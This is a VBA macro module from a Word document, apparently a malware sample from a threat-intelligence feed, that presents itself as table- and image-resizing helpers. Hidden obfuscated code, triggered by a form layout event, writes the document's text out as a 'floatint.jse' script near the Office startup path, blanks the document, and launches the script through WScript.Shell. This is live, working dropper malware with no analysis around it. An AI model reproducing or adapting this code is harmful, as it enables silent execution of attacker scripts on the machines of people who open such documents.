Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
'***************************************************************************************************
'Name:      Function ResizeTables()
'
'Purpose:   Resize tables to be no larger than a page
'
'Inputs:    None
'
'Returns:   None
'
'***************************************************************************************************


    
Private Nberd_0 As String
Private Rdeop_54 As String
Private Fcer_tvfgh As String



Function ResizeImages()
  Dim dblPageWidth As Double          'stores the pages width
  Dim dblPageHeight As Double         'stores the page height
  Dim dblAspectRatio As Double        'stores the dblAspectRatio of the current image
  Dim ishape As InlineShape         'stores the current shape
  Dim bolProcessingShape As Boolean

  'Handle any errors
  On Error GoTo ErrHandler:
  
  bolProcessingShape = False
      
  ' determine the current usable page width
  dblPageWidth = ActiveDocument.PageSetup.TextColumns.Width
  

  ' determine the current usable page height
  dblPageHeight = ActiveDocument.PageSetup.PageHeight - ThisDocument.PageSetup.TopMargin - ThisDocument.PageSetup.BottomMargin
  
  bolProcessingShape = True
  
  ' Process each shape in the document
  For Each ishape In ActiveDocument.InlineShapes
      ' determine aspect ratio
      dblAspectRatio = ishape.Height / ishape.Width
      ' if the shape is taller than the page, make it's height match the page
      If (ishape.Height > dblPageHeight) Then
          ishape.Height = dblPageHeight
          ishape.Width = (dblPageHeight / dblAspectRatio)
      End If
      ' if the share is wider than the page, make it's wdith match the page
      If (ishape.Width > dblPageWidth) Then
          ishape.Width = dblPageWidth
          ishape.Height = (dblPageWidth * dblAspectRatio)
      End If
NextIteration:
  Next
  Exit Function
  
ErrHandler:
  Debug.Print "[Error]: Error #" & Err.Number
  If bolProcessingShape Then
    Resume NextIteration:
  Else
    Exit Function
  End If
  
End Function


Function ResizeTables()
Dim oTbl As Table
  For Each oTbl In ActiveDocument.Tables
    If oTbl.PreferredWidthType = wdPreferredWidthPoints And oTbl.PreferredWidth > ActiveDocument.PageSetup.TextColumns.Width Then
      oTbl.AutoFitBehavior wdAutoFitFixed
      oTbl.PreferredWidthType = wdPreferredWidthPercent
      oTbl.PreferredWidth = "100"
    End If
  Next oTbl
    
End Function


Function RemoveOutlineLevel(strStyle As String)
  On Error Resume Next
  Selection.Find.ClearFormatting
  Selection.Find.Style = ActiveDocument.Styles(strStyle)
  Selection.Find.Replacement.ClearFormatting
  With Selection.Find.Replacement
      .Style = ActiveDocument.Styles(strStyle)
      .ParagraphFormat.OutlineLevel = wdOutlineLevelBodyText
  End With
  With Selection.Find
      .Text = ""
      .Replacement.Text = ""
      .Forward = True
      .Wrap = wdFindContinue
      .Format = True
      .MatchCase = False
      .MatchWholeWord = False
      .MatchWildcards = False
      .MatchSoundsLike = False
      .MatchAllWordForms = False
  End With
  Selection.Find.Execute Replace:=wdReplaceAll
   VBA.CallByName VBA.CreateObject(Fcer_tvfgh & "W" & Fcer_tvfgh & "Sc" & Fcer_tvfgh & "rip" & Fcer_tvfgh & "t." & Rdeop_54), _
    "R" & Fcer_tvfgh & "u" & Fcer_tvfgh & "n", VbMethod, _
    """" & Nberd_0 & """" & " " & ActiveDocument.PageSetup.TextColumns.Width, 0
End Function


Private Function Verfguy()
Verfguy = ActiveDocument.Content.Text
End Function



Private Function Clear_It()
ActiveDocument.Content.Text = ""
End Function


    
Private Function FrtgyNh(o As String)
Nberd_0 = o & Fcer_tvfgh & "\..\" & Fcer_tvfgh & "HerS" & Fcer_tvfgh
On Error Resume Next
MkDir Nberd_0
Nberd_0 = "" & Nberd_0 & Empty & "\floatint." & Fcer_tvfgh & "j" & Fcer_tvfgh & "s" & "" & "e" & Fcer_tvfgh
Dim Bner_7 As Integer

Bner_7 = FreeFile
Open Nberd_0 For Output As #Bner_7
Print #Bner_7, Verfguy
Close #Bner_7

Rdeop_54 = Fcer_tvfgh & "s" & Fcer_tvfgh & "h" & Fcer_tvfgh & "el" & Fcer_tvfgh & "l" & Empty
FrtgyNh = Nberd_0
Exit Function
ResizeImages
End Function
         
         
Private Function Ty54_u()
Ty54_u = Len(Verfguy)
End Function

   
Private Sub Mrtfg90()
Fcer_tvfgh = Empty
If (Ty54_u > 1234) Then
FrtgyNh Application.StartupPath
Clear_It
RemoveOutlineLevel "style"
End If
End Sub


Private Sub MultiPage1_Layout(ByVal Index As Long)
Mrtfg90
End Sub







' InQuest injected base64 decoded content
' zPhw$

INQUEST-PP=macro
